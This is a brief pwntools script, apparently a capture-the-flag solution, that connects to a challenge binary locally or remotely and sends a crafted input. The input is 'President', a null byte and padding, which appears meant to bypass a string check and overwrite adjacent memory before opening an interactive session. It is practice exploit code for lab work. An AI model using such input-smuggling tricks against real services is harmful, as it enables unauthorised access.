#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

p.sendline(b"President\x00aaaaaaaaaaaaaaaaaaaaaaaaa")

p.interactive()